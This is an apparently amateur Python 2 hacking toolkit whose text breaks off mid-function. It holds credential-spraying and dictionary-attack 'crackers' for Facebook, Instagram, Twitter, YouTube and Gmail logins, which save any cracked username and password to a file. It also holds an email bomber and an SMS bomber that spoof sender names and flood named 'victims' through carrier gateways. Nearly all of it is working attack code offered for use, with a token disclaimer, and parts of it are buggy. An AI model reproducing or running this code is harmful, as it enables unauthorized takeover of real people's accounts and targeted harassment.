#!/usr/bin/env python
import requests
import random
import pytube
import math
import getpass
import sys
import smtplib
import mechanize
import os
import urllib
import uuid
import copy
import calendar
import hashlib
import hmac
import cookielib
import time
from time import sleep
from getpass import getpass
from subprocess import call

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan  

def useragent():
  useragents = [
           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
  return random.choice(useragents)
###################################################################################################  
#==================================================================================================
def uinsta():
	attempt = 0
	os.system('clear')
	print ""+P+" "
	url = 'https://www.instagram.com/accounts/login/?force_classic_login'
	print '''
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{} Unconventional-Instagram-cracker 4  | Created by Andrew{}
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{   Username or Phone#/Email| p=phon/email u=userlis   }
	{}========================================================{}
	This Cracker uses a username list and one password to test 
	all the users against
	'''
	upe = raw_input('option')
	if upe == 'u':
		usernamelist = raw_input(color.YELLOW + 'PATH to User-Acount-List:' + color.END)
		usernamelist = open(usernamelist, 'r')
		usernamelist = list(usernamelist)
		for user in usernamelist:
			username = user.strip()
			
			fbv = requests.get('https://www.instagram.com/' + username)
			if fbv.status_code == 200:
				print username + 'Account Exists!'
			else:
				print username + "Account doesn't exist"
				usernamelist.remove(user)
		print "Marked all non-existing accounts from list"
		raw_input('Press enter to continue....')
		os.system('clear')
	elif upe == 'p':
		usernamelist = raw_input(color.YELLOW + "PATH to user-Account-List:" + color.END)
		usernamelist = open(usernamelist, 'r')
	else:
		os.system('clear')
		print "Soemthing went off"
		raw_input('Press Enter to continue...')
		uinsta()
	password = raw_input(color.YELLOW + 'Password:' + color.END)
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		outfil = open(outfiler, 'a')
	except:
		os.system('clear')
		print "That file does not exist"
		raw_input('Press enter to continue...')
		uinsta()
	for username in usernamelist:
		username = username.strip()
		password = password.strip()
		attempt = attempt+1
		i = mechanize.Browser()
		i.set_handle_equiv(True)
		i.set_handle_referer(True)
		i.set_handle_robots(False)
		i.addheaders = [('User-Agent', useragent)]
		webres = i.open(url)
		i.form = list(i.forms())[0]
		i.form['username'] = username
		i.form['password'] = password
		i.method = 'POST'
		response = i.submit()
		i.close()
		r = response.geturl()
		print '[+]====================================[+]'
		print '[+]Instagram-Cracker| Created by Andrew[+]'
		print '[+]++++++++++++++++++++++++++++++++++++[+]'
		
		if r == 'https://www.instagram.com/' or r == 'https://www.instagram.com/mobileprotection?source=mobile_mirror_nux' or r == 'https://www.instagram.com/?sk=welcome':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + 'Instagram:' + 'Username:' + username + ' Password:' + password + color.END
			outfile = open(outfiler, 'a')
			outfile.write('\n Instagram:' + 'Username:' + username + 'Password:' + password)
			print color.GREEN + 'File Saved at %s' % outfil + color.END
			outfile.close()
			break
		
		elif r == 'https://www.instagram.com/accounts/login/?force_classic_login':
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % usernamelist
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
				sleep(0.09)
		else:
			print response.geturl()
			print 'If this signature apears, It means the account may be locked, or unnacccessable by normal means...'
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + ' \n Instagram:' + 'Username:' + username + ' Password:' + password + color.END
			outfile = open(outfiler, 'a')
			outfile.write('\n Instagram:' + 'Username:' + username + 'Password:' + password)
			print color.GREEN + 'File Saved at %s' % outfil + color.END
			outfil.close()		
			
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		uwp()
#=========================================================================
def utwit():
	attempt = 0
	os.system('clear')
	print ""+C+" "
	url = 'https://m.twitter.com/login/'
	print '''
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{} Unconventional-Twitter-cracker 4  | Created by Andrew{}
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{   Username or Phone#/Email|  user input=userlis }
	{}======================================================{}
	This Cracker uses a username list and one password to test 
	all the users against
	'''
	usernamelist = raw_input(color.YELLOW + 'PATH to User-Acount-Lidt:' + color.END)
	usernamelist = open(usernamelist, 'r')
	password = raw_input(color.YELLOW + 'Password:' + color.END)
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		outfil = open(outfiler, 'a')
	except:
		os.system('clear')
		print "That file does not exist"
		raw_input('Press enter to continue...')
		uinsta()
	for username in usernamelist:
		username = username.strip()
		password = password.strip()
		attempt = attempt+1
		t = mechanize.Browser()
		t.set_handle_equiv(True)
		t.set_handle_referer(True)
		t.set_handle_robots(False)
		t.addheaders = [('User-Agent', useragent)]
		webres = t.open(url)
		t.form = list(t.forms())[0]
		t.form['session[username_or_email]'] = username
		t.form['session[password]'] = password
		t.method = 'POST'
		response = t.submit()
		t.close()
		r = response.geturl()
		print '[+]==================================[+]'
		print '[+]Twitter-Cracker| Created by Andrew[+]'
		print '[+]++++++++++++++++++++++++++++++++++[+]'
		if r == 'https://www.twitter.com/' or r == 'https://mobile.twitter.com/' or r == 'https://www.twitter.com/mobileprotection?source=mobile_mirror_nux' or r == 'https://www.twitter.com/?sk=welcome':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + 'Twitter:' + 'Username:' + username + ' Password:' + password + color.END
			outfile = open(outfiler, 'a')
			outfile.write('\n Twitter:' + 'Username:' + username + 'Password:' + password)
			print color.GREEN + 'File Saved at %s' % outfil + color.END
			outfile.close()	
		else:
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
			sleep(0.09)
			
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		uwp()
#========================================================================
def uyou():
	attempt = 0
	os.system('clear')
	print ""+R+" "
	print '''
	[+]========================[+]
	[+]Youtube-Account| Cracker[+]
	[+]========================[+]
	'''
	password = raw_input(color.YELLOW + 'Password for users:' + color.END)
	lister = raw_input(color.YELLOW + 'PATH to user list:' + color.END)
	panther = raw_input(color.YELLOW + 'PATH to output' + color.END)
	lister = open(lister, 'r')
	for username in lister:
		try:
			username = username.strip()
			b = mechanize.Browser()
			res = b.open('https://www.youtube.com/signin')
			b.set_handle_equiv(True)
			b.set_handle_referer(True)
			b.set_handle_robots(False)
			b.select_form(nr=0)
			b.form['Email'] = username
			ier = b.submit()
			attempt = attempt + 1
			password = password.strip()
			b.set_handle_equiv(True)
			b.set_handle_referer(True)
			b.set_handle_robots(False)
			b.select_form(nr=0)
			b.form['Passwd'] = password
			er = b.submit()
			b.close()
			print '''
			[+]=========================[+]
			[+]Youtube-Cracker|Andrew-el[+]
			[+]=========================[+]
			'''
			print er.geturl()
			if er.geturl() == 'https://www.youtube.com/':
				os.system('clear')
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % lister
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print('Success!, Password Found| ' + color.GREEN + password + color.END)
				pather = open(panther, 'a')
				pather.write('\n' + 'YouTube:' + 'Username: ' + username + ' Password:' + password + 'Attempt:' + str(attempt))
				print'Done!'
				pather.close()
			else:
				os.system('clear')
				print er.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % lister
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print(color.PURPLE + password + ' Does not work.')
				print('Next....')
				sleep(0.09)
		except:
			print username + ' Not connected to or a Real Google/Youtube Account'
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		uwp()
#========================================================================
def ugmail():
	os.system('clear')
	print ""+O+" "
	attempt = 0
	print '''
	[+]=============================[+]
	[+]Unconventional-Gmail-Cracker:[+]
	[+]=============================[+]
	'''
	print ""+P+" "
	password = raw_input(color.YELLOW + "Password for all users:" + color.END)
	usernamese = raw_input(color.YELLOW + 'PATH to userlist list:' + color.END)
	try:
		usernames = open(usernamese, 'r')
	except:
		print "That File Doesn't exst"
		raw_input("Press enter to continuee....")
		ugmail()
	outfil = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		userel = open(outfil, 'r')
	except:
		print "That file doesn't exist"
		raw_input("Press enter to continuee....")
		ugmail()
	for username in usernames:
		try:
			attempt = attempt + 1
			password = password.strip()
			username = username.strip()
			g = mechanize.Browser()
			g.set_handle_robots(False)
			r = g.open('https://www.gmail.com/')
			g.select_form(nr=0)
			g.form['Email'] = username
			t = g.submit()
			g.select_form(nr=0)
			print ""+P+" "
			g.select_form(nr=0)
			g.form['Passwd'] = password
			gg = g.submit()
			g.close()
			print '[+]==================================================[+]'
			print '[+] Unconventional-Gmail-Account-Crack| Andrew-Hacker[+]'
			print '[+]==================================================[+]'
			gg = gg.geturl()
			if gg == 'https://mail.google.com/mail/u/0/' or gg == 'https://mail.google.com/mail/u/0/h/170u3222gfs3s/?zy=s&f=1':
				print gg
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % usernamese
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('[+]===================================[+]')
				print(color.GREEN + 'Password Found!' + color.END)
				print color.GREEN + 'Gmail:' + 'Username:' + username + ' Password:' + password + color.END
				outfile = open(outfil, 'a')
				outfile.write('\n Gmail:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % outfil + color.END
				outfile.close()	
				
			else:
				print gg
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % usernamese
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
				sleep(6)
		except:
			print "Sorry, %s  Account Doesn't Exist.... Testing next account" % username
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		uwp()
#=============================================================================================================================
def uface():
	os.system('clear')
	print ""+B+" "
	attempt = 0
	url = 'https://www.facebook.com/login.php'
	print '''
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{} Unconventional-Facebook-cracker 4.5 | Created by Andrew{}
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{   Username or Phone#/Email|   }
	{}========================================================{}
	This Cracker uses a username list and one password to test 
	all the users against
	'''
	usernamelistr = raw_input(color.YELLOW + 'PATH to User-Acount-List:' + color.END)
	usernamelist = open(usernamelistr, 'r')
	usernamelist = list(usernamelist)
	for user in usernamelist:
		username = user.strip()
		fbv = requests.get('https://www.facebook.com/' + username)
		if fbv.status_code == 200:
			print username + 'Account Exists!'
		else:
			print username + "Account doesn't exist"
			usernamelist.remove(user)
	print "Marked all non-existing accounts from list"
	raw_input('Press enter to continue....')
	os.system('clear')
	pass
	password = raw_input(color.YELLOW + 'Password for users:' + color.END)
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		outfil = open(outfiler, 'a')
	except:
		os.system('clear')
		print "That file does not exist"
		raw_input('Press enter to continue...')
		uface()
	for username in usernamelist:
		username = username.strip()
		password = password.strip()
		attempt = attempt+1
		f = mechanize.Browser()
		f.set_handle_equiv(True)
		f.set_handle_referer(True)
		f.set_handle_robots(False)
		f.addheaders = [('User-Agent', useragent)]
		webres = f.open(url)
		f.form = list(f.forms())[0]
		f.form['email'] = username
		f.form['pass'] = password
		f.method = 'POST'
		response = f.submit()
		f.close()
		r = response.geturl()
		print '[+]===================================[+]'
		print '[+]Facebook-Cracker| Created by Andrew[+]'
		print '[+]+++++++++++++++++++++++++++++++++++[+]'
		
		if r == 'https://www.facebook.com/' or r == 'https://www.facebook.com/checkpoint/?next' or r == 'https://www.facebook.com/?sk=welcome':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + 'Facebook:' + 'Username:' + username + ' Password:' + password + color.END
			outfile = open(outfiler, 'a')
			outfile.write('\n Facebook:' + 'Username:' + username + 'Password:' + password)
			print color.GREEN + 'File Saved at %s' % outfil + color.END
			outfile.close()		
		else:
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
			sleep(6)
			
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		uwp()
#========================================================================
def uwp():
	os.system('clear')
	print ""+W+" "
	print '''
	[+]=======================================[+]
	[+]Created by Andrew|Unconventional-cracks[+]
	[+]=======================================[+]
	[+]These programs are multitarget based
	with the use of a single password for
	multiple user cracks: These are unconventional
	cracks but if you are like me, you will use find
	ways to use this effectively.
	(Dictionary/Bruteforce Based)
	[1] facebook
	[2] instagram
	[3] twitter
	[4] youtube
	[5] gmail
	[99] back to menu
	'''
	opt4 = raw_input("option:")
	if opt4 == '1':
		uface()
	elif opt4 == '2':
		uinsta()
	elif opt4 == '3':
		utwit()
	elif opt4 == '4':
		uyou()
	elif opt4 == '5':
		ugmail()
	elif opt4 == '99':
		menu()
	else:
		os.system('clear')
		print 'Type in a number corrosponding to the program'
		raw_input("Press enter to continue...")
		uwp()
######################################################################################################################################
def sgm():
	os.system('clear')
	print ""+P+" "
	attempt = 0
	print '''
	[+]=====================[+]
	[+]Single-Gmail-Cracker:[+]
	[+]=====================[+]
	'''
	print ""+P+" "
	username = raw_input(color.YELLOW + "Victem's Email:" + color.END)
	passlis = raw_input(color.YELLOW + 'PATH to Password list:' + color.END)
	timmel = int(raw_input('Please set time between attempts:(Default is 5 seconds):') or 5)
	paslist = open(passlis, 'r')
	print 'Do you wish to save output to file?'
	out = raw_input('yes/no:')
	out = out.lower()
	if out == 'yes':
		outfil = raw_input(color.YELLOW + 'PATH to output:' + color.END)
		try:
			outfilr = open(outfil, 'a')
		except:
			os.system('clear')
			print "That file does not exist"
			raw_input('Press enter to continue...')
			sgm()
	elif out == 'no':
		pass
	else:
		os.system('clear')
		print 'Sorry, That is not an option'
		raw_input('Press enter to continue......')
		sgm()
	for password in paslist:
		attempt = attempt + 1
		password = password.strip()
		g = mechanize.Browser()
		g.set_handle_robots(False)
		r = g.open('https://www.gmail.com/')
		g.select_form(nr=0)
		g.form['Email'] = username
		t = g.submit()
		g.select_form(nr=0)
		print ""+P+" "
		g.select_form(nr=0)
		g.form['Passwd'] = password
		gg = g.submit()
		g.close()
		print '[+]===================================[+]'
		print '[+] Gmail-Account-Crack| Andrew-Hacker[+]'
		print '[+]===================================[+]'
		gg = gg.geturl()
		if gg == 'https://mail.google.com/mail/u/0/' or gg == 'https://mail.google.com/mail/u/0/h/170u3222gfs3s/?zy=s&f=1':
			print gg
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlis
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + 'Gmail:' + 'Username:' + username + ' Password:' + password + color.END
			outfile = open(outfil, 'a')
			outfile.write('\n Gmail:' + 'Username:' + username + 'Password:' + password)
			print color.GREEN + 'File Saved at %s' % outfil + color.END
			outfile.close()
			der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				gmenu()		
		else:
			print gg
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlis
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
			if str(attempt) == '10':
				sleep(10)
				os.system('clear')
			else:
				sleep(timmel)
				os.system('clear')
def mgm():
	os.system('clear')
	print ""+P+" "
	attempt = 0
	print '''
	[+]======================[+]
	[+]multiple-Gmail-Cracker:[+]
	[+]======================[+]
	'''
	print ""+P+" "
	usernamelist = raw_input(color.YELLOW + 'PATH to Email List:' + color.END)
	passlis = raw_input(color.YELLOW + 'PATH to Password list:' + color.END)
	timmel = int(raw_input('Please set time between attempts:(Default is 5 seconds):') or 5)
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	usernamelist = open(usernamelist, 'r')
	for username in usernamelist:
		paslist = open(passlis, 'r')
		username = username.strip()
		for password in paslist:
			try:
				attempt = attempt + 1
				password = password.strip()
				g = mechanize.Browser()
				g.set_handle_robots(False)
				r = g.open('https://www.gmail.com/')
				g.select_form(nr=0)
				g.form['Email'] = username
				t = g.submit()
				g.set_handle_robots(False)
				g.select_form(nr=0)
				print ""+P+" "
				g.select_form(nr=0)
				g.form['Passwd'] = password
				gg = g.submit()
				g.close()
				print '[+]===================================[+]'
				print '[+] Gmail-Account-Crack| Andrew-Hacker[+]'
				print '[+]===================================[+]'
				gg = gg.geturl()
				if gg == 'https://mail.google.com/mail/u/0/' or gg == 'https://mail.google.com/mail/u/0/h/170u3222gfs3s/?zy=s&f=1':
					print gg
					print('{Username:%s}') % username
					print('{Wordlist:%s}') % passlis
					print('{Password:%s}') % password
					print('{Pass Attempt:%s}') % str(attempt)
					print('[+]===================================[+]')
					print(color.GREEN + 'Password Found!' + color.END)
					print color.GREEN + 'Gmail:' + 'Username:' + username + ' Password:' + password + color.END
					outfile = open(outfiler, 'a')
					outfile.write('\n Gmail:' + 'Username:' + username + 'Password:' + password)
					print color.GREEN + 'File Saved at %s' % outfile + color.END
					outfile.close()
					break
				else:
					print gg
					print('{Username:%s}') % username
					print('{Wordlist:%s}') % passlis
					print('{Password:%s}') % password
					print('{Pass Attempt:%s}') % str(attempt)
					print('============================')
					print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
					if str(attempt) == '10':
						sleep(10)
						os.system('clear')
					else:
						sleep(timmel)
						os.system('clear')
			except:
				print username + ' Is not affiliated with or an acceptable Gmail account'
				break
		paslist.close()

		
		
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		gac()
	
		
#######################################################################################################################################
def gac():
	os.system('clear')
	print ""+P+" "
	print '''
	[G]=====================================[G]
	[G] Gmail    Hacker | Created by Andrew [G]
	[G]-------------------------------------[G]
	[G]single crack hacks one user with list[G]
	[G]=====================================[G]
	[G]mass crack hacks user list with Plist[G]
	[G]=====================================[G]
	
	s = single user crack
	m = mass user crack
	q = quit
	mm = main menu
	'''
	fbm = raw_input('option:')
	fbm = fbm.lower()
	if fbm == 's':
		sgm()
	elif fbm == 'm':
		mgm()
	elif fbm == 'q':
		quit()
	elif fbm == 'mm':
		menu()
	else:
		os.system('clear')
		print 'Sorry, type s for single or m for mass'
		raw_input('Press enter to continue.......')
		gmenu()
#######################################################################################################################################
def meb():
	os.system('clear')
	print ""+T+" "
	phonelst = raw_input(color.UNDERLINE + 'Path to Victem-Email list' + color.END)
	phonelst = open(phonelst, 'rb')
	print ""+T+" "
	gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
	print ""+T+" "
	fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
	print ""+T+" "
	password = getpass(color.UNDERLINE + 'Password>' + color.END)
	o = smtplib.SMTP("smtp.gmail.com:587")
	o.starttls()
	o.login(gmail, password)
	message = raw_input(color.UNDERLINE + 'Message>' + color.END)
	print ""+T+" "
	counter = input(color.UNDERLINE + 'How many times>' + color.END)
	print ""+T+" "
	for phone in phonelst:
		try:
		    spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone, message)
		    print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
		    for i in range(counter):
			o.sendmail(fromname, phone, spam_msg)
		    	sleep(0.004)
		    
		    	print(phone)
		    	print (color.UNDERLINE + ''+G+'[*] Successfully sent' + color.END), counter ,(color.UNDERLINE + ''+G+'[*] messages!' + color.END)
		  	der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				smsatt()
		except:
		    
		    print("Sorry you typed something wrong. Please review the info you typed")
		    print("your info is right here:", " ", gmail, " ", password, " ", spam_msg)
		    b = raw_input("Press Enter to Continue")	
		    meb()
def seb():
	os.system('clear')
	print ""+T+" "
	phone_num = raw_input(color.UNDERLINE + 'Victims Email>' + color.END)
	print ""+T+" "
	gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
	print ""+T+" "
	password = getpass(color.UNDERLINE + 'Password>' + color.END)
	fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
	print ("This function should make your message anonymous, unless google fixes the this flaw")

	o = smtplib.SMTP("smtp.gmail.com:587")
	o.starttls()
	o.login(gmail, password)
	print ""+T+" "
	message = raw_input(color.UNDERLINE + 'Message>' + color.END)
	print ""+T+" "
	counter = input(color.UNDERLINE + 'How many times>' + color.END)
	print ""+T+" "
	spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone_num, message)
	print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
	for i in range(counter):
		o.sendmail(gmail, phone_num, spam_msg)
		sleep(0.004)
		print(phone_num)
		print (color.UNDERLINE + ''+G+'[*] Successfully sent ' + str(counter) + ' Messages!' + color.END)
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		eb()	
############################################################################################################################################
def eb():
	os.system('clear')
	print ""+O+" "
	print """
		        [+]==============================[+]
		        [+]::::::::Email-Attacker::::::::[+]
		        [+]==============================[+]
		        ====================================
		        Created and Designed by Andrew El+++
		        ====================================
		        ***********By Chosing an option*********
		        You recognize and accept the disclaimer+
		        I am not responsible how you use this 
		        software. take great care in using it...
		        """
	print ""+P+" "
	print """
		        +++++++++++++++++++++++++++++++++++++++++++
		        this Email-bomb
		        attack will send spam anonomoously
		        (whatever you choose) to target as many times
		        you type in.
		        ++++++++++++++++++++++++++++++++++++++++++++
		        options: s=single target m=mass email list
		        			t=exit/back to menu
		        ++++++++++++++++++++++++++++++++++++++++++++
		        **************lowercase*********************
		        """
	print ""+C+" "
	option = raw_input('option:')
	option = option.lower()
	if option == 's':
		os.system('clear')
		seb()
	elif option == 'm':
		os.system('clear')
		meb()	
	elif option == 't':
		os.system('clear')
		der = raw_input('Press Enter to return to menu.. or b to exit:')
		der = der.lower()
		if der == 'b':
			quit()
		else:
			cc()	
	else:
		os.system('clear')
		print ""+R+" "
		print "Sorry Just Type s,m,or t only"
		p = raw_input('Press enter to continue...')
		eb()
#######################################################################################################################################
def gmenu():
	os.system('clear')
	print ""+P+" "
	print '''
	[+]=============================[+]
	[+]Gmail-Cracker|Andrew -Hacker [+]
	[+]=============================[+]
	[1] Gmail-Account-Hacker
	[2] Anonymous-Email-Bomber
	[3] future projects coming soon...
	[99] Previous menu
	
	'''
	gd = raw_input('option:')
	if gd == '1':
		gac()
	elif gd == '2':
		eb()
	elif gd == '99':
		cc()
	else:
		os.system('clear')
		print 'Type in a number corrosponding to the program'
		raw_input("Press enter to continue...")
		gmenu()
	
########################################################################################################################################
#######################################################################################################################################
def msms():
	os.system('clear')
	print ""+G+" "
	print """
		[+]======================[+]
		[!] Mass List SMS Attack:[!]
		[+]======================[+]
		When creating the file list, remember to attack the carrier to the end of each number.
		[+] example. 4567834214@txt.att.net[+]
		here is a list of the different carrier types.
		You can look them up also at online if theres a new one.
		"AT&T: @txt.att.net"
		"Qwest: @tmomail.net"
		"T-Mobile: @tmomail.net"
		"Verizon: @vtext.com"
		"Sprint: @messaging.sprintpcs.com or @pm.sprint.com"
		"Virgin Mobile: @vmobl.com "
		"Nextel: @messaging.nextel.com"
		"Alltel: @message.alltel.com"
		"Metro PCS: @mymetropcs.com"
		"Powertel: @ptel.com"
		"Boost Mobile: @myboostmobile.com"
		"Suncom: @tms.suncom.com"
		"tracfone: @mmst5.tracfone.com"
		"U.S Cellular: @email.uscc.net"
		"Put the @ sign before the provider"
		"""
	print ""+T+" "
	phonelst = raw_input(color.UNDERLINE + 'Path to Victem list' + color.END)
	phonelst = open(phonelst, 'rb')
	print ""+T+" "
	gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
	print ""+T+" "
	fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
	print ""+T+" "
	password = getpass(color.UNDERLINE + 'Password>' + color.END)
	o = smtplib.SMTP("smtp.gmail.com:587")
	o.starttls()
	o.login(gmail, password)
	message = raw_input(color.UNDERLINE + 'Message>' + color.END)
	print ""+T+" "
	counter = input(color.UNDERLINE + 'How many times>' + color.END)
	print ""+T+" "
	for phone in phonelst:
		try:
		    spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone, message)
		    print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
		    for i in range(counter):
		        o.sendmail(fromname, phone, spam_msg)
		    	sleep(0.004)
		    
		    	print(phone)
		    	print (color.UNDERLINE + ''+G+'[*] Successfully sent' + color.END), counter ,(color.UNDERLINE + ''+G+'[*] messages!' + color.END)
		  	der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				smsatt()
		except:
		    
		    print("Sorry you typed something wrong. Please review the info you typed")
		    print("your info is right here:", " ", gmail, " ", password, " ", spam_msg)
		    b = raw_input("Press Enter to Continue")	
		    msms()
        

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	


def ssms():
	os.system('clear')
	print ""+B+""
	print ("""
		[+]==========================================[+]
		[+]Single SMS Attack-------------------------[+]
		[+]==========================================[+]

		"AT&T: @txt.att.net"
		"Qwest: @tmomail.net"
		"T-Mobile: @tmomail.net"
		"Verizon: @vtext.com"
		"Sprint: @messaging.sprintpcs.com or @pm.sprint.com"
		"Virgin Mobile: @vmobl.com "
		"Nextel: @messaging.nextel.com"
		"Alltel: @message.alltel.com"
		"Metro PCS: @mymetropcs.com"
		"Powertel: @ptel.com"
		"Boost Mobile: @myboostmobile.com"
		"Suncom: @tms.suncom.com"
		"tracfone: @mmst5.tracfone.com"
		"U.S Cellular: @email.uscc.net"
		"Put the @ sign before the provider"
		""")
	provider = raw_input(color.UNDERLINE + 'Enter cellular provider>' + color.END)
	print ""+T+" "
	phone_num = raw_input(color.UNDERLINE + 'Victims phone number>' + color.END) + provider
	print ""+T+" "
	gmail = raw_input(color.UNDERLINE + 'Your email>' + color.END)
	print ""+T+" "
	password = getpass(color.UNDERLINE + 'Password>' + color.END)
	fromname = '.' + ' ' + raw_input(color.UNDERLINE + 'Name of the user you want target to see' + color.END)
	print ("This function should make your message anonymous, unless google fixes the this flaw")

	o = smtplib.SMTP("smtp.gmail.com:587")
	o.starttls()
	o.login(gmail, password)
	print ""+T+" "
	message = raw_input(color.UNDERLINE + 'Message>' + color.END)
	print ""+T+" "
	counter = input(color.UNDERLINE + 'How many times>' + color.END)
	print ""+T+" "
	spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(fromname, phone_num, message)
	print (color.UNDERLINE + ''+G+'[*] Sending...' + color.END)
	for i in range(counter):
